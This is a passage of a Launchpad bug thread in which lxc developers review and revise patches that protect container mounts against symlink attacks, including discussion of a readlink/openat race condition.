    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4467228/+files/0001-Protect-container-mounts-against-symlinks.patch">New patch against git HEAD</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4467228">Edit</a>
        (20.1 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/44" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-17T22:46:22.541188+00:00" title="2015-09-17 22:46:22 UTC">on 2015-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/44"> #44</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Looks good to me!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Looks good to me!</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/45" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-18T06:45:44.778666+00:00" title="2015-09-18 06:45:44 UTC">on 2015-09-18</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/45"> #45</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Also to me. If I understand correctly, code inside e.g. validate_symlink is only secure when applied to a non-running container (where any process completely under guest control is launched). Otherwise there is TOCTOU between readlink and openat.</p>
<p>As  the code is inside src/lxc/utils.c should we place comments before each of those functions, so that no one else will find them convenient, does not know about this implicit requirements and use it for something else.</p>
<p>&quot;CAVEAT: This function must not be used for other purposes than container setup before executing the container&#x27;s init?&quot;</p>
<p>Apart from that, &quot;validate_symlink&quot; using destbuf would work around that but could make the code more prone to endless recursions. (Was the patch already checked against symlink loops?)</p>
<p>Could the description of open_without_<wbr />symlink be out of sync with code?<br />
&quot;Open a path intending for mounting, ensuring there are no symbolic links in the path anywhere after &#x27;prefix_skip&#x27; (if set).&quot;<br />
After checking the prefix, it calls open_if_safe which will validate_symlink and use it, when symlink encountered?</p>
<p>I haven&#x27;t checked the whole patch yet, would take hours, but perhaps someone could do two straces of container startup on patched machine (one normal and one with a problematic symlink) and I will try to do the same analysis as  for the initial report according to methods from <a rel="nofollow" href="https://service.ait.ac.at/security/2015/LxcSecurityAnalysis.html">https:/<wbr />/service.<wbr />ait.ac.<wbr />at/security/<wbr />2015/LxcSecurit<wbr />yAnalysis.<wbr />html</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Also to me. If I understand correctly, code inside e.g. validate_symlink is only secure when applied to a non-running container (where any process completely under guest control is launched). Otherwise there is TOCTOU between readlink and openat.

As  the code is inside src/lxc/utils.c should we place comments before each of those functions, so that no one else will find them convenient, does not know about this implicit requirements and use it for something else.

"CAVEAT: This function must not be used for other purposes than container setup before executing the container's init?"

Apart from that, "validate_symlink" using destbuf would work around that but could make the code more prone to endless recursions. (Was the patch already checked against symlink loops?)

Could the description of open_without_symlink be out of sync with code?
"Open a path intending for mounting, ensuring there are no symbolic links in the path anywhere after 'prefix_skip' (if set)."
After checking the prefix, it calls open_if_safe which will validate_symlink and use it, when symlink encountered?

I haven't checked the whole patch yet, would take hours, but perhaps someone could do two straces of container startup on patched machine (one normal and one with a problematic symlink) and I will try to do the same analysis as  for the initial report according to methods from https://service.ait.ac.at/security/2015/LxcSecurityAnalysis.html
 </textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/46" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-18T15:21:53+00:00" title="2015-09-18 15:21:53 UTC">on 2015-09-18</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/lxc/+bug/1476662/comments/46">
                <strong>Re: [Bug 1476662] Re: lxc-start symlink vulnerabilities may allow guest to read host filesystem, interfere with apparmor</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/46"> #46</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Quoting Roman Fiedler (&lt;email address hidden&gt;):<br />
<span class="foldable-quoted">
&gt; Also to me. If I understand correctly, code inside e.g. validate_symlink<br />
&gt; is only secure when applied to a non-running container (where any
</span></p>
<p>The code is only run against non-running containers, however the symlinks<br />
can be changed if the container configuration (under the host admin&#x27;s<br />
control) has two mount entries, the first bind-mounting the attacker&#x27;s<br />
homedir into the container, and the second mounting to someplace under<br />
the bind-mounted home.</p>
<p>So the TOCTTOU between readlink and openat is a problem.  Sigh.</p>
<p>We could re-check the readlink after the openat, but the attacker could<br />
presumably try to very quickly move the link back...</p>
<p>So using destbuf may be better.  If the target is also a link, simply<br />
returning EPERM at that point should be ok.  We&#x27;re not trying to support<br />
every possible configuration.  The real cases we need to support are<br />
things like /proc/net.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Quoting Roman Fiedler (roman.fiedler@ait.ac.at):
&gt; Also to me. If I understand correctly, code inside e.g. validate_symlink
&gt; is only secure when applied to a non-running container (where any

The code is only run against non-running containers, however the symlinks
can be changed if the container configuration (under the host admin's
control) has two mount entries, the first bind-mounting the attacker's
homedir into the container, and the second mounting to someplace under
the bind-mounted home.

So the TOCTTOU between readlink and openat is a problem.  Sigh.

We could re-check the readlink after the openat, but the attacker could
presumably try to very quickly move the link back...

So using destbuf may be better.  If the target is also a link, simply
returning EPERM at that point should be ok.  We're not trying to support
every possible configuration.  The real cases we need to support are
things like /proc/net.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/47" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-18T15:46:05.191790+00:00" title="2015-09-18 15:46:05 UTC">on 2015-09-18</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/47"> #47</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;m REALLY feeling like just doing mount followed by a check of /proc/self/<wbr />mountinfo would&#x27;ve been more robust.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I'm REALLY feeling like just doing mount followed by a check of /proc/self/mountinfo would've been more robust.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/48" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-18T16:22:00.527997+00:00" title="2015-09-18 16:22:00 UTC">on 2015-09-18</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/48"> #48</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Updated patch to GIT HEAD</p>
<p>(updated comments)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Updated patch to GIT HEAD

(updated comments)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/49" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-18T17:10:46.671450+00:00" title="2015-09-18 17:10:46 UTC">on 2015-09-18</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/49"> #49</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4467949/+files/0001-Protect-container-mounts-against-symlinks.patch">hopefully final patch (with manpage update) against git HEAD</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4467949">Edit</a>
        (22.4 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/50" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-18T20:05:37.254971+00:00" title="2015-09-18 20:05:37 UTC">on 2015-09-18</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/50"> #50</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>After irc discussion we realized the patch was insufficient.</p>
<p>This new patch makes some changes.  It forbids all symlinks in the mount target.  The case for which this broke lxc before has been taken care of by not mounting onto proc/net (which is a symlink to proc/self/net).  It also forbids symlinks in relative bind mount sources.  If needed we can later add a mount option saying to allow symlinks, but since we allow symlinks for absolute source paths this may not be needed.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">After irc discussion we realized the patch was insufficient.

This new patch makes some changes.  It forbids all symlinks in the mount target.  The case for which this broke lxc before has been taken care of by not mounting onto proc/net (which is a symlink to proc/self/net).  It also forbids symlinks in relative bind mount sources.  If needed we can later add a mount option saying to allow symlinks, but since we allow symlinks for absolute source paths this may not be needed.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/51" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-18T20:39:08.500809+00:00" title="2015-09-18 20:39:08 UTC">on 2015-09-18</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/51"> #51</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4468090/+files/0001-Protect-container-mounts-against-symlinks.patch">Patch against git head</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4468090">Edit</a>
        (22.3 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/52" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-22T20:04:09.935710+00:00" title="2015-09-22 20:04:09 UTC">on 2015-09-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/52"> #52</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4471605/+files/0001-Protect-container-mounts-against-symlinks.patch">patch against 1.0.7</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4471605">Edit</a>
        (19.6 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/53" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-22T20:05:15.338766+00:00" title="2015-09-22 20:05:15 UTC">on 2015-09-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/53"> #53</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4471606/+files/0001-Protect-container-mounts-against-symlinks.patch">Patch against 1.1.2</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4471606">Edit</a>
        (21.0 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/55" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-22T20:06:33.617899+00:00" title="2015-09-22 20:06:33 UTC">on 2015-09-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/55"> #55</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4471609/+files/0001-Protect-container-mounts-against-symlinks.patch">patch against 1.1.3</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4471609">Edit</a>
        (21.6 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/56" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-22T20:06:58.738627+00:00" title="2015-09-22 20:06:58 UTC">on 2015-09-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/56"> #56</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4471610/+files/0001-Protect-container-mounts-against-symlinks.patch">patch against stable-1.0</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4471610">Edit</a>
        (20.4 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/57" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
